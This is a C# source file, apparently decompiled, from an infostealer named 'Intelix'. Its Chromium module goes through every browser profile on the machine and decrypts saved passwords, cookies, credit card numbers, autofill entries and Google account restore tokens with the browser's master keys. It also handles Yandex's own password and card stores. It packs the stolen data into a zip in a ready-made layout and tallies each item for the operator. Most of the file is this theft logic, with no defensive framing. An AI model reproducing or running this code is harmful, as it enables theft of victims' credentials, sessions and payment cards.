using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Intelix.Helper;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using Intelix.Helper.Sql;

namespace Intelix.Targets.Browsers
{
	// Token: 0x02000037 RID: 55
	public class Chromium : ITarget
	{
		// Token: 0x060000B0 RID: 176 RVA: 0x00009DA4 File Offset: 0x00007FA4
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Parallel.ForEach<string>(Paths.Chromium, delegate(string browser)
			{
				bool flag = Directory.Exists(browser);
				if (flag)
				{
					Parallel.ForEach<string>(Directory.GetDirectories(browser), delegate(string profile)
					{
						this.ProfileCollect(zip, counter, browser, profile);
					});
				}
			});
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x00009DE4 File Offset: 0x00007FE4
		private void ProfileCollect(InMemoryZip zip, Counter counter, string browser, string profile)
		{
			string localstate = browser + "\\Local State";
			string browsername = Paths.GetBrowserName(browser);
			string profilename = Path.GetFileName(profile);
			byte[] masterv10 = LocalState.MasterKeyV10(localstate);
			byte[] masterv20 = LocalState.MasterKeyV20(localstate);
			Counter.CounterBrowser counterBrowser = new Counter.CounterBrowser();
			counterBrowser.Profile = profile;
			counterBrowser.BrowserName = browsername;
			object[][] source = new object[][]
			{
				new object[]
				{
					"Login Data",
					Path.Combine(profile, "Login Data"),
					new string[]
					{
						"logins"
					}
				},
				new object[]
				{
					"Login Data For Account",
					Path.Combine(profile, "Login Data For Account"),
					new string[]
					{
						"logins"
					}
				},
				new object[]
				{
					"Network Cookies",
					Path.Combine(profile, "Network", "Cookies"),
					new string[]
					{
						"cookies"
					}
				},
				new object[]
				{
					"Cookies",
					Path.Combine(profile, "Cookies"),
					new string[]
					{
						"cookies"
					}
				},
				new object[]
				{
					"Web Data",
					Path.Combine(profile, "Web Data"),
					new string[]
					{
						"AutoFill",
						"credit_cards",
						"token_service",
						"masked_credit_cards",
						"masked_ibans"
					}
				},
				new object[]
				{
					"Ya Passman Data",
					Path.Combine(profile, "Ya Passman Data"),
					new string[]
					{
						"logins"
					}
				},
				new object[]
				{
					"Ya Credit Cards",
					Path.Combine(profile, "Ya Credit Cards"),
					new string[]
					{
						"records"
					}
				}
			};
			Dictionary<string, Action<SqLite>> handlers = new Dictionary<string, Action<SqLite>>(StringComparer.OrdinalIgnoreCase)
			{
				{
					"Login Data/logins",
					delegate(SqLite sSqLite)
					{
						this.Password(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Login Data For Account/logins",
					delegate(SqLite sSqLite)
					{
						this.Password(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Cookies/cookies",
					delegate(SqLite sSqLite)
					{
						this.Cookies(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Network Cookies/cookies",
					delegate(SqLite sSqLite)
					{
						this.Cookies(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Web Data/AutoFill",
					delegate(SqLite sSqLite)
					{
						this.AutoFill(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Web Data/credit_cards",
					delegate(SqLite sSqLite)
					{
						this.CreditCards(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Web Data/token_service",
					delegate(SqLite sSqLite)
					{
						this.TokenRestore(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Web Data/masked_credit_cards",
					delegate(SqLite sSqLite)
					{
						this.MaskCreditCards(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Web Data/masked_ibans",
					delegate(SqLite sSqLite)
					{
						this.MaskedIbans(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Ya Passman Data/logins",
					delegate(SqLite sSqLite)
					{
						this.YandexPassword(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				},
				{
					"Ya Credit Cards/records",
					delegate(SqLite sSqLite)
					{
						this.YandexGetCard(zip, counterBrowser, sSqLite, profilename, browsername, masterv10, masterv20);
					}
				}
			};
			Parallel.ForEach<object[]>(source, delegate(object[] file)
			{
				string name = (string)file[0];
				string path = (string)file[1];
				string[] source2 = (string[])file[2];
				bool flag2 = File.Exists(path);
				if (flag2)
				{
					byte[] bytes;
					try
					{
						bytes = File.ReadAllBytes(path);
					}
					catch
					{
						return;
					}
					Parallel.ForEach<string>(source2, delegate(string table)
					{
						try
						{
							SqLite sqLite = new SqLite(bytes);
							sqLite.ReadTable(table);
							string key = name + "/" + table;
							Action<SqLite> action;
							bool flag3 = handlers.TryGetValue(key, out action);
							if (flag3)
							{
								action(sqLite);
							}
						}
						catch
						{
						}
					});
				}
			});
			bool flag = counterBrowser.Cookies != 0L || counterBrowser.Password != 0L || counterBrowser.CreditCards != 0L || counterBrowser.AutoFill != 0L || counterBrowser.RestoreToken != 0L || counterBrowser.MaskCreditCard != 0L || counterBrowser.MaskedIban != 0L;
			if (flag)
			{
				counter.Browsers.Add(counterBrowser);
			}
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x0000A1B8 File Offset: 0x000083B8
		private void Password(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			bool flag = masterv10 == null && masterv20 == null;
			if (!flag)
			{
				ConcurrentBag<string> lines = new ConcurrentBag<string>();
				Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
				{
					try
					{
						string value = sSqLite.GetValue(i, 0);   // origin_url
						string value2 = sSqLite.GetValue(i, 3);  // username_value
						string plainPwd = sSqLite.GetValue(i, 4); // password_value plain (old Chrome)
						byte[] bytes = Encoding.Default.GetBytes(sSqLite.GetValue(i, 5)); // password_value encrypted
						bool flag2 = !string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2);
						if (flag2)
						{
							string password = plainPwd;
							if (string.IsNullOrEmpty(plainPwd))
							{
								byte[] array = AesGcm.DecryptBrowser(bytes, masterv10, masterv20, false);
								if (array != null)
									password = Encoding.UTF8.GetString(array);
							}
							if (!string.IsNullOrEmpty(password))
							{
								string item = string.Concat(new string[]
								{
									"Hostname: ", value, "\nUsername: ", value2,
									"\nPassword: ", password, "\n\n"
								});
								lines.Add(item);
								Counter.CounterBrowser counterBrowser2 = counterBrowser;
								counterBrowser2.Password = ++counterBrowser2.Password;
							}
						}
					}
					catch
					{
					}
				});
				zip.AddTextFile(string.Concat(new string[]
				{
					"Passwords\\Passwords_[",
					browsername,
					"]",
					profilename,
					".txt"
				}), string.Concat(lines));
			}
		}

		// Token: 0x060000B3 RID: 179 RVA: 0x0000A270 File Offset: 0x00008470
		private void Cookies(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			bool flag = masterv10 == null && masterv20 == null;
			if (!flag)
			{
				ConcurrentBag<string> lines = new ConcurrentBag<string>();
				Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
				{
					try
					{
						// col 4 = value (plain text for old unencrypted cookies)
						// col 5 = encrypted_value (blob for new encrypted cookies)
						// col 1 = host_key, col 3 = name, col 6 = path, col 7 = expires_utc
						string plainValue = sSqLite.GetValue(i, 4);
						string value2 = sSqLite.GetValue(i, 1); // host
						string value3 = sSqLite.GetValue(i, 3); // name
						string value4 = sSqLite.GetValue(i, 6); // path
						string value5 = sSqLite.GetValue(i, 7); // expires
						bool flag2 = !string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value3) && !string.IsNullOrEmpty(value4) && !string.IsNullOrEmpty(value5);
						if (flag2)
						{
							string cookieValue = plainValue;
							// If plain value is empty — it's encrypted, decrypt it
							if (string.IsNullOrEmpty(plainValue))
							{
								byte[] bytes = Encoding.Default.GetBytes(sSqLite.GetValue(i, 5));
								byte[] array = AesGcm.DecryptBrowser(bytes, masterv10, masterv20, true);
								if (array != null && array.Length > 0)
								{
									cookieValue = Encoding.UTF8.GetString(array);
									Counter.CounterBrowser counterBrowser2 = counterBrowser;
									counterBrowser2.Cookies = ++counterBrowser2.Cookies;
								}
							}
							if (!string.IsNullOrEmpty(cookieValue))
							{
								string item = string.Concat(new string[]
								{
									value2, "\tTRUE\t", value4, "\tFALSE\t",
									value5, "\t", value3, "\t", cookieValue, "\n"
								});
								lines.Add(item);
							}
						}
					}
					catch
					{
					}
				});
				zip.AddTextFile(string.Concat(new string[]
				{
					"Cookies\\Cookies_[",
					browsername,
					"]",
					profilename,
					".txt"
				}), string.Concat(lines));
			}
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x0000A328 File Offset: 0x00008528
		private void AutoFill(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
			{
				try
				{
					string value = sSqLite.GetValue(i, 0);
					string value2 = sSqLite.GetValue(i, 1);
					bool flag = !string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value);
					if (flag)
					{
						string item = string.Concat(new string[]
						{
							"Name: ",
							value,
							"\nValue: ",
							value2,
							"\n\n"
						});
						lines.Add(item);
						Counter.CounterBrowser counterBrowser2 = counterBrowser;
						counterBrowser2.AutoFill = ++counterBrowser2.AutoFill;
					}
				}
				catch
				{
				}
			});
			zip.AddTextFile(string.Concat(new string[]
			{
				"AutoFills\\AutoFill_[",
				browsername,
				"]",
				profilename,
				".txt"
			}), string.Concat(lines));
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x0000A3B4 File Offset: 0x000085B4
		private void CreditCards(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			bool flag = masterv10 == null && masterv20 == null;
			if (!flag)
			{
				ConcurrentBag<string> lines = new ConcurrentBag<string>();
				Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
				{
					try
					{
						byte[] bytes = Encoding.Default.GetBytes(sSqLite.GetValue(i, 4));
						string value = sSqLite.GetValue(i, 3);
						string value2 = sSqLite.GetValue(i, 2);
						string value3 = sSqLite.GetValue(i, 1);
						bool flag2 = bytes != null && !string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(value2) && !string.IsNullOrEmpty(value3);
						if (flag2)
						{
							byte[] array = AesGcm.DecryptBrowser(bytes, masterv10, masterv20, false);
							bool flag3 = array != null;
							if (flag3)
							{
								string @string = Encoding.UTF8.GetString(array);
								string item = string.Concat(new string[]
								{
									"Number: ",
									@string,
									"\nExp: ",
									value2,
									"/",
									value,
									"\nHolder: ",
									value3,
									"\n\n"
								});
								lines.Add(item);
								Counter.CounterBrowser counterBrowser2 = counterBrowser;
								counterBrowser2.CreditCards = ++counterBrowser2.CreditCards;
							}
						}
					}
					catch
					{
					}
				});
				zip.AddTextFile(string.Concat(new string[]
				{
					"CreditCards\\CreditCards_[",
					browsername,
					"]",
					profilename,
					".txt"
				}), string.Concat(lines));
			}
		}

		// Token: 0x060000B6 RID: 182 RVA: 0x0000A46C File Offset: 0x0000866C
		private void TokenRestore(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			bool flag = masterv10 == null && masterv20 == null;
			if (!flag)
			{
				ConcurrentBag<string> lines = new ConcurrentBag<string>();
				Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
				{
					try
					{
						string value = sSqLite.GetValue(i, 0);
						byte[] bytes = Encoding.Default.GetBytes(sSqLite.GetValue(i, 1));
						bool flag2 = bytes != null;
						if (flag2)
						{
							byte[] array = AesGcm.DecryptBrowser(bytes, masterv10, masterv20, false);
							bool flag3 = array != null;
							if (flag3)
							{
								string text = Encoding.UTF8.GetString(array) + ":" + value.Replace("AccountId-", "") + "\n";
								lines.Add(text);
								Counter.CounterBrowser counterBrowser2 = counterBrowser;
								counterBrowser2.RestoreToken = ++counterBrowser2.RestoreToken;
								bool flag4 = value.Contains("AccountId");
								if (flag4)
								{
									zip.AddTextFile(string.Concat(new string[]
									{
										"Cookies\\CookiesRestore_[",
										browsername,
										"]",
										profilename,
										".txt"
									}), RestoreCookies.CRestore(text));
								}
							}
						}
					}
					catch
					{
					}
				});
				zip.AddTextFile(string.Concat(new string[]
				{
					"RestoreToken\\RestoreToken_[",
					browsername,
					"]",
					profilename,
					".txt"
				}), string.Concat(lines));
			}
		}

		// Token: 0x060000B7 RID: 183 RVA: 0x0000A548 File Offset: 0x00008748
		private void YandexPassword(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			bool flag = masterv10 == null;
			if (!flag)
			{
				byte[] encryptionKey = LocalEncryptor.ExtractEncryptionKey(sSqLite, masterv10);
				bool flag2 = encryptionKey == null || encryptionKey.Length != 32;
				if (!flag2)
				{
					ConcurrentBag<string> lines = new ConcurrentBag<string>();
					Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
					{
						try
						{
							string value = sSqLite.GetValue(i, 0);
							string value2 = sSqLite.GetValue(i, 2);
							string value3 = sSqLite.GetValue(i, 3);
							string value4 = sSqLite.GetValue(i, 4);
							string value5 = sSqLite.GetValue(i, 7);
							byte[] bytes = Encoding.Default.GetBytes(sSqLite.GetValue(i, 5));
							bool flag3 = bytes.Length != 0;
							if (flag3)
							{
								byte[] bytes2 = YaAuthenticatedData.Decrypt(encryptionKey, bytes, value, value2, value4, value3, value5);
								string item = string.Concat(new string[]
								{
									"Hostname: ",
									value,
									"\nUsername: ",
									value3,
									"\nPassword: ",
									Encoding.UTF8.GetString(bytes2),
									"\n\n"
								});
								lines.Add(item);
								Counter.CounterBrowser counterBrowser2 = counterBrowser;
								counterBrowser2.Password = ++counterBrowser2.Password;
							}
						}
						catch
						{
						}
					});
					zip.AddTextFile(string.Concat(new string[]
					{
						"Passwords\\Passwords_[",
						browsername,
						"]",
						profilename,
						".txt"
					}), string.Concat(lines));
				}
			}
		}

		// Token: 0x060000B8 RID: 184 RVA: 0x0000A618 File Offset: 0x00008818
		private void YandexGetCard(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			bool flag = masterv10 == null;
			if (!flag)
			{
				byte[] encryptionKey = LocalEncryptor.ExtractEncryptionKey(sSqLite, masterv10);
				bool flag2 = encryptionKey == null || encryptionKey.Length != 32;
				if (!flag2)
				{
					ConcurrentBag<string> lines = new ConcurrentBag<string>();
					Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
					{
						try
						{
							byte[] bytes = Encoding.Default.GetBytes(sSqLite.GetValue(i, 0));
							byte[] bytes2 = Encoding.Default.GetBytes(sSqLite.GetValue(i, 2));
							string value = sSqLite.GetValue(i, 1);
							byte[] array = new byte[12];
							Array.Copy(bytes2, 0, array, 0, 12);
							int num = bytes2.Length - 12 - 16;
							byte[] array2 = new byte[num];
							Array.Copy(bytes2, 12, array2, 0, num);
							byte[] array3 = new byte[16];
							Array.Copy(bytes2, bytes2.Length - 16, array3, 0, 16);
							string @string = Encoding.UTF8.GetString(AesGcm256.Decrypt(encryptionKey, array, bytes, array2, array3));
							Match match = Regex.Match(@string, "[\"']?full_card_number[\"']?\\s*:\\s*[\"']?(?<v>[\\d\\s\\-]+)[\"']?", RegexOptions.IgnoreCase);
							string text = match.Success ? match.Groups["v"].Value.Trim() : null;
							bool flag3 = string.IsNullOrEmpty(text);
							if (flag3)
							{
								Match match2 = Regex.Match(@string, "[\"']?(?:card_number|number)[\"']?\\s*:\\s*[\"']?(?<v>[\\d\\s\\-]+)[\"']?", RegexOptions.IgnoreCase);
								text = (match2.Success ? match2.Groups["v"].Value.Trim() : null);
							}
							Match match3 = Regex.Match(value, "[\"']?expire_date_month[\"']?\\s*:\\s*[\"']?(?<m>\\d{1,2})[\"']?", RegexOptions.IgnoreCase);
							Match match4 = Regex.Match(value, "[\"']?expire_date_year[\"']?\\s*:\\s*[\"']?(?<y>\\d{2,4})[\"']?", RegexOptions.IgnoreCase);
							string text2 = match3.Success ? match3.Groups["m"].Value.PadLeft(2, '0') : null;
							string text3 = match4.Success ? match4.Groups["y"].Value : null;
							Match match5 = Regex.Match(value, "[\"']?card_holder[\"']?\\s*:\\s*[\"'](?<v>(?:\\\\.|[^\"])*)[\"']", RegexOptions.IgnoreCase | RegexOptions.Singleline);
							string text4 = match5.Success ? match5.Groups["v"].Value : null;
							bool flag4 = string.IsNullOrEmpty(text4);
							if (flag4)
							{
								Match match6 = Regex.Match(value, "[\"']?(?:cardholder|holder|name)[\"']?\\s*:\\s*[\"'](?<v>(?:\\\\.|[^\"])*)[\"']", RegexOptions.IgnoreCase | RegexOptions.Singleline);
								text4 = (match6.Success ? match6.Groups["v"].Value : text4);
							}
							bool flag5 = !string.IsNullOrEmpty(text4);
							if (flag5)
							{
								text4 = Regex.Unescape(text4);
								text4 = Regex.Replace(text4, "\\\\u([0-9A-Fa-f]{4})", (Match m) => ((char)Convert.ToInt32(m.Groups[1].Value, 16)).ToString());
								text4 = text4.Trim();
								bool flag6 = Regex.IsMatch(text4, "^[A-Za-z0-9\\+/=]{8,}$");
								if (flag6)
								{
									try
									{
										byte[] bytes3 = Convert.FromBase64String(text4);
										string string2 = Encoding.UTF8.GetString(bytes3);
										bool flag7 = !string.IsNullOrWhiteSpace(string2);
										if (flag7)
										{
											text4 = string2.Trim();
										}
									}
									catch
									{
									}
								}
							}
							bool flag8 = string.IsNullOrEmpty(text);
							if (flag8)
							{
								text = "Unknown";
							}
							bool flag9 = string.IsNullOrEmpty(text2);
							if (flag9)
							{
								text2 = "Unknown";
							}
							bool flag10 = string.IsNullOrEmpty(text3);
							if (flag10)
							{
								text3 = "Unknown";
							}
							bool flag11 = string.IsNullOrEmpty(text4);
							if (flag11)
							{
								text4 = "Unknown";
							}
							string item = string.Concat(new string[]
							{
								"Number: ",
								text,
								"\nExp: ",
								text2,
								"/",
								text3,
								"\nHolder: ",
								text4,
								"\n\n"
							});
							lines.Add(item);
							Counter.CounterBrowser counterBrowser2 = counterBrowser;
							counterBrowser2.CreditCards = ++counterBrowser2.CreditCards;
						}
						catch
						{
						}
					});
					zip.AddTextFile(string.Concat(new string[]
					{
						"CreditCards\\CreditCards_[",
						browsername,
						"]",
						profilename,
						".txt"
					}), string.Concat(lines));
				}
			}
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x0000A6E8 File Offset: 0x000088E8
		private void MaskCreditCards(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
			{
				try
				{
					string value = sSqLite.GetValue(i, 1);
					string value2 = sSqLite.GetValue(i, 2);
					string value3 = sSqLite.GetValue(i, 3);
					string value4 = sSqLite.GetValue(i, 4);
					string value5 = sSqLite.GetValue(i, 5);
					string value6 = sSqLite.GetValue(i, 6);
					string value7 = sSqLite.GetValue(i, 7);
					string value8 = sSqLite.GetValue(i, 12);
					string item = string.Concat(new string[]
					{
						"Name On Card: ",
						value,
						"\nNetwork: ",
						value2,
						"\nCard Last Number: ",
						value3,
						"\nExp: ",
						value4,
						"/",
						value5,
						"\nBank Name: ",
						value6,
						"\nNickName: ",
						value7,
						"\nProduct Description: ",
						value8,
						"\n\n"
					});
					lines.Add(item);
					Counter.CounterBrowser counterBrowser2 = counterBrowser;
					counterBrowser2.MaskCreditCard = ++counterBrowser2.MaskCreditCard;
				}
				catch
				{
				}
			});
			zip.AddTextFile(string.Concat(new string[]
			{
				"MaskCreditCards\\MaskCreditCards_[",
				browsername,
				"]",
				profilename,
				".txt"
			}), string.Concat(lines));
		}

		// Token: 0x060000BA RID: 186 RVA: 0x0000A774 File Offset: 0x00008974
		private void MaskedIbans(InMemoryZip zip, Counter.CounterBrowser counterBrowser, SqLite sSqLite, string profilename, string browsername, byte[] masterv10, byte[] masterv20)
		{
			ConcurrentBag<string> lines = new ConcurrentBag<string>();
			Parallel.For(0, sSqLite.GetRowCount(), delegate(int i)
			{
				try
				{
					string value = sSqLite.GetValue(i, 1);
					string value2 = sSqLite.GetValue(i, 2);
					string value3 = sSqLite.GetValue(i, 3);
					string item = string.Concat(new string[]
					{
						"Nickname: ",
						value3,
						"\nPrefix: ",
						value,
						"\nSuffix: ",
						value2,
						"\n\n"
					});
					lines.Add(item);
					Counter.CounterBrowser counterBrowser2 = counterBrowser;
					counterBrowser2.MaskedIban = ++counterBrowser2.MaskedIban;
				}
				catch
				{
				}
			});
			zip.AddTextFile(string.Concat(new string[]
			{
				"MaskedIbans\\MaskedIbans[",
				browsername,
				"]",
				profilename,
				".txt"
			}), string.Concat(lines));
		}
	}
}
